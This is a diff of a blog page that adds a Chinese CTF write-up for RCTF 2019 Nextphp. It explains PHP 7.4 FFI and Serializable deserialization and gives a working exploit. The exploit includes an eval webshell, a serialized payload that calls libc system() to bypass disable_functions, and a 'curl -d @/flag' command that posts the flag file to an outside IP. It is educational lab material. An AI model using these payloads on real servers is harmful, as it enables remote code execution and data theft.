@@ -20,18 +20,22 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="BUUCTF刷题记录">
+  <meta name="description" content="RCTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTF刷题汇总">
+<meta property="og:title" content="[RCTF 2019]Nextphp（PHP7.4特性）">
 <meta property="og:url" content="http://example.com/2022/10/10/BUUCTF%E5%88%B7%E9%A2%98/index.html">
 <meta property="og:site_name" content="Security">
-<meta property="og:description" content="BUUCTF刷题记录">
+<meta property="og:description" content="RCTF">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/10/27/i2ucVGnEmOT9bAd.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/27/oxag3r8sA5nHh12.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/27/vsgIyQThVuEqMza.png">
 <meta property="article:published_time" content="2022-10-10T14:25:19.196Z">
-<meta property="article:modified_time" content="2022-10-11T12:11:36.464Z">
+<meta property="article:modified_time" content="2022-11-02T08:50:23.689Z">
 <meta property="article:author" content="l3ife">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/10/27/i2ucVGnEmOT9bAd.png">
 
 <link rel="canonical" href="http://example.com/2022/10/10/BUUCTF%E5%88%B7%E9%A2%98/">
 
@@ -46,7 +50,7 @@
   };
 </script>
 
-  <title>BUUCTF刷题汇总 | Security</title>
+  <title>[RCTF 2019]Nextphp（PHP7.4特性） | Security</title>
   
 
 
@@ -120,7 +124,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">6</span></a>
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">8</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -130,7 +134,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">11</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">13</span></a>
 
   </li>
   </ul>
@@ -174,7 +178,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          BUUCTF刷题汇总
+          [RCTF 2019]Nextphp（PHP7.4特性）
         </h1>
 
         <div class="post-meta">
@@ -191,7 +195,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-10-11 20:11:36" itemprop="dateModified" datetime="2022-10-11T20:11:36+08:00">2022-10-11</time>
+                <time title="修改时间：2022-11-02 16:50:23" itemprop="dateModified" datetime="2022-11-02T16:50:23+08:00">2022-11-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -199,12 +203,12 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
+                  <a href="/categories/CTF%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">CTF刷题</span></a>
                 </span>
             </span>
 
           
-            <div class="post-description">BUUCTF刷题记录</div>
+            <div class="post-description">RCTF</div>
 
         </div>
       </header>
@@ -215,7 +219,208 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1>
+        <h1 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h1><p><strong>参考</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.notion.so/BUU-caeec8b455ca4c30aa8c09b2a2fc6ed7#7652e9a652ce49deb47e77138eefb51c">参考文章1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.notion.so/BUU-caeec8b455ca4c30aa8c09b2a2fc6ed7#3725fed03775446c8bb2ed6d56d19513">参考文章2</a></p>
+<p><strong>php 7.4 FFI扩展学习</strong></p>
+<p>FFI是php7.4出的一个扩展，提供了高级语言直接调用，而对于PHP来说，FFI让我们可以方便的调用C语言写的各种库</p>
+<p>参考网上博主资料，编写C语言的代码获取命令行窗开</p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//Filename cli_size.c</span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">struct</span> winsize <span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">struct</span> winsize size<span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span>TIOCGWINSZ<span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> size<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">get_cil_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">struct</span> winsize size<span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span>TIOCGWINSZ<span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> size<span class="token punctuation">.</span>ws_row<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">get_cil_cols</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">struct</span> winsize size<span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span>TIOCGWINSZ<span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> size<span class="token punctuation">.</span>ws_col<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>定义结构体和两个函数</p>
+<p>将c代码编译成动态链接库libcli_size.so</p>
+<pre class=" language-c"><code class="language-c">gcc <span class="token operator">-</span>O2 <span class="token operator">-</span>fPIC <span class="token operator">-</span>shared <span class="token operator">-</span>g cli_size<span class="token punctuation">.</span>c <span class="token operator">-</span>o libcli_size<span class="token punctuation">.</span>so
+</code></pre>
+<p>使用php的 FFI:cdef()函数声明我们要调用的这个库中的<strong>函数</strong>以及使用到的<strong>数据类型</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">//filename cli_size.php</span>
+<span class="token variable">$ffi</span><span class="token operator">=</span><span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">CTYPE</span>
+struct winsize<span class="token punctuation">{</span>
+    unsigned short ws_row<span class="token punctuation">;</span>
+    unsigned short ws_col<span class="token punctuation">;</span>
+    unsigned short ws_xpixel<span class="token punctuation">;</span>
+    unsigned short ws_ypixel<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+unsigned short <span class="token function">get_cli_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+unsigned short <span class="token function">get_cli_cols</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+struct winsze <span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token constant">CTYPE</span><span class="token punctuation">,</span><span class="token string">'libcli_size.so'</span><span class="token punctuation">)</span>
+
+<span class="token operator">></span>
+</code></pre>
+<p>定义了声明CTYPE，调用winsize和get_cli_rows和get_cli_cols函数。</p>
+<p>声明为FFI：：cdef的第一个参数，第二个参数为库文件名。</p>
+<p><strong>如果不传入第二个参数可以直接调用PHP代码，下面EXP在声明后即可加入PHP代码</strong>。</p>
+<p>调用</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_cli_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_cli_cols</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>输出</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">int</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// get_cli_rows()的结果</span>
+<span class="token function">int</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// get_cli_cols()的结果</span>
+<span class="token function">object</span><span class="token punctuation">(</span><span class="token constant">FFI</span>\<span class="token package"><span class="token punctuation">\</span>CData</span><span class="token punctuation">:</span>struct winsize<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (4) {    </span><span class="token comment" spellcheck="true">// get_size()的结果，也就是winsize结构体，</span>
+  <span class="token punctuation">[</span><span class="token string">"ws_row"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>
+  <span class="token punctuation">[</span><span class="token string">"ws_col"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span>
+  <span class="token punctuation">[</span><span class="token string">"ws_xpixel"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">)</span>
+  <span class="token punctuation">[</span><span class="token string">"ws_ypixel"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
+  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">684</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">int</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// get_cli_rows()的结果</span>
+</code></pre>
+<p>unsigned short类型在这里变成了php的int, 结构体struct winsize变成了一个FFI\CData对象</p>
+<p>从结构体对象获取属性值</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ws_row</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出int(36)</span>
+</code></pre>
+<p><strong>FFI利用原理</strong></p>
+<p>调用C标准库的system函数，就会使用cdef去加载，cdef会把存放在system函数功能的动态链接库libc加载到内存里，这样PHP的进程空间就有system，这也就是disable_function过滤了system函数，结果的Payload也是用system的原因，是因为加载C库函数的system函数</p>
+<p><strong>核心思想</strong>：</p>
+<blockquote>
+<p>实现用PHP代码调用C代码的方式，声明C的命令执行函数，然后通过FFI变量调用C函数即可Bypass disabe_functions</p>
+</blockquote>
+<p><strong>Serializable接口</strong></p>
+<p><img src="https://s2.loli.net/2022/10/27/i2ucVGnEmOT9bAd.png" alt="image.png"></p>
+<p>php表明一个类同时存在Serializable和__Serialize() &#x2F;_Unserialize()，则序列化将倾向使用新机制，而非序列化则使用其中一种机制，具体取决使用C（Serializable）还是O（Un unserialize）。以C格式编码的旧的序列化字符串仍可以解码，新的字符串将以O格式生成</p>
+<p>所以等会遇到的脚本存在Serializable接口，使用序列化时旧决定使用C，也就是序列化后首字母为C而不是O。同时会执行Serializable接口的方法，且EXP需要把__Unserialize()删掉。</p>
+<p>Serializable为自定义序列化接口，实现此接口的类不支持__sleep()和__wakeup()，当类实例被序列化将在自动调用serialize方法，不会调用__destruct()。当类的实例被反序列化，将调用unserialize方法，不执行__construct()</p>
+<h1 id="0x01-解题思路"><a href="#0x01-解题思路" class="headerlink" title="0x01 解题思路"></a>0x01 解题思路</h1><p>打开代码仅有两行</p>
+<pre><code>&lt;?php
+if (isset($_GET[&#39;a&#39;])) &#123;
+    eval($_GET[&#39;a&#39;]);
+&#125; else &#123;
+    show_source(__FILE__);
+</code></pre>
+<p>查看disable_function禁用了什么函数</p>
+<p><img src="https://s2.loli.net/2022/10/27/oxag3r8sA5nHh12.png" alt="image.png"></p>
+<p>尝试file_put_contents写shell，在使用蚁剑插件绕过disable_functions，但是没有那么简单</p>
+<pre><code>file_put_contents(&#39;gt.php&#39;,&#39;&lt;?php eval($_REQUEST[gt]);?&gt;&#39;);
+</code></pre>
+<p>文件里有个preload.php，看一下</p>
+<p><img src="https://s2.loli.net/2022/10/27/vsgIyQThVuEqMza.png" alt="image.png"></p>
+<pre><code>&lt;?php
+final class A implements Serializable &#123;
+    protected $data = [
+        &#39;ret&#39; =&gt; null,
+        &#39;func&#39; =&gt; &#39;print_r&#39;,
+        &#39;arg&#39; =&gt; &#39;1&#39;
+    ];
+
+    private function run () &#123;
+        $this-&gt;data[&#39;ret&#39;] = $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);
+    &#125;
+
+    public function __serialize(): array &#123;
+        return $this-&gt;data;
+    &#125;
+
+    public function __unserialize(array $data) &#123;
+        array_merge($this-&gt;data, $data);
+        $this-&gt;run();
+    &#125;
+
+    public function serialize (): string &#123;
+        return serialize($this-&gt;data);
+    &#125;
+
+    public function unserialize($payload) &#123;
+        $this-&gt;data = unserialize($payload);
+        $this-&gt;run();
+    &#125;
+
+    public function __get ($key) &#123;
+        return $this-&gt;data[$key];
+    &#125;
+
+    public function __set ($key, $value) &#123;
+        throw new \Exception(&#39;No implemented&#39;);
+    &#125;
+
+    public function __construct () &#123;
+        throw new \Exception(&#39;No implemented&#39;);
+    &#125;
+&#125;
+</code></pre>
+<p>以Serializable接口调用serialize方法，且传递三个属性ret、func、arg，并没有用户传参</p>
+<pre><code>以Serializable接口调用serialize方法，且传递三个属性ret、func、arg，并没有用户传参
+</code></pre>
+<p>构造反序列化在a里面调用__get(’ret’)输出值，可控arg和func。</p>
+<p><strong>注意</strong>：php7.4新特性会优先触发__serialize和__unserialize方法，需要删掉</p>
+<p>EXP</p>
+<pre><code>&lt;?php
+final class A implements Serializable &#123;
+    protected $data = [
+        &#39;ret&#39; =&gt; null,
+        &#39;func&#39; =&gt; &#39;FFI::cdef&#39;,  
+        &#39;arg&#39; =&gt; &#39;int system(const char *command);&#39;
+    ];
+# FFI::cdef int system(constchar * command);
+    
+    public function serialize(): string&#123;
+        return serialize($this-&gt;data);
+    &#125;
+
+    public function unserialize($payload) &#123;
+        $this-&gt;data = unserialize($payload);
+        
+    &#125;
+&#125;
+ 
+$a=new A();
+$b= serialize($a);
+echo $b;
+</code></pre>
+<p>序列化结果为</p>
+<pre><code>C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;
+</code></pre>
+<p>实现了声明</p>
+<pre><code>FFI::cdef(&quot;int system(const char *command);&quot;)
+</code></pre>
+<p>还需要调用，设置 __serialize()[’ret’]值获取flag</p>
+<pre><code>__serialize()[’ret’]-&gt;system(’curl -d @/flag IP’)
+</code></pre>
+<p>完整的Payload</p>
+<pre><code>?a=$a=unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&#39;curl -d @/flag 192.168.50.246:9528&#39;);
+</code></pre>
+<p>传参流程</p>
+<p>1.unserialize</p>
+<p>将payload传递给idata参数，覆盖原来参数</p>
+<pre><code>protected $data = [
+        &#39;ret&#39; =&gt; null,
+        &#39;func&#39; =&gt; &#39;print_r&#39;,
+        &#39;arg&#39; =&gt; &#39;1&#39;
+    ];
+</code></pre>
+<p>2.run</p>
+<p>将新值带入ret，ret为FFI::cdef int system(constchar * command);</p>
+<p>3.__serialize()</p>
+<p>指定ret为最终执行命令，通过最后return调用，返回flag</p>
+<p>还可以直接写入文件</p>
+<pre><code>?a=unserialize(base64_decode(&#39;QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319&#39;))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&#39;cat /flag&gt;/var/www/html/1.txt&#39;);
+</code></pre>
+
     </div>
 
     
@@ -230,7 +435,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2022/10/10/BUUCTF%E5%88%B7%E9%A2%98/" title="BUUCTF刷题汇总">http://example.com/2022/10/10/BUUCTF刷题/</a>
+    <a href="http://example.com/2022/10/10/BUUCTF%E5%88%B7%E9%A2%98/" title="[RCTF 2019]Nextphp（PHP7.4特性）">http://example.com/2022/10/10/BUUCTF刷题/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -250,8 +455,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/10/10/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="SQL注入">
-      <i class="fa fa-chevron-left"></i> SQL注入
+    <a href="/2022/10/06/ATT&CK-2/" rel="prev" title="[靶场练习]ATT&CK-2">
+      <i class="fa fa-chevron-left"></i> [靶场练习]ATT&CK-2
     </a></div>
       <div class="post-nav-item">
     <a href="/2022/10/18/ctfshow-ssti/" rel="next" title="SSTI模板注入">
@@ -315,7 +520,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">0x01 解题思路</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -329,7 +534,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -342,7 +547,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
